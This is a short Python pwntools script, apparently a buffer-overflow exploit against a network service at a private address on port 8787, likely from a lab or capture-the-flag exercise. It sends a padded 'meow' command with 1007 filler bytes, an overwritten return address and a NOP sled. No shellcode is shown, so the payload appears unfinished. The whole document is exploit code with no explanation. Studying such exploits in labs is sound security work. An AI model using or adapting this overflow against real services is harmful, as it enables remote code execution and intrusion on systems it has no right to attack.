#!/usr/bin/python
from pwn import *

offset = 1007

r = remote('192.168.223.141', 8787)
r.recvuntil(b']')

payload  = b'meow ' + b'A' * offset
payload += p32(0x1121480)
payload += b'\x90' * 40
r.sendline(payload)

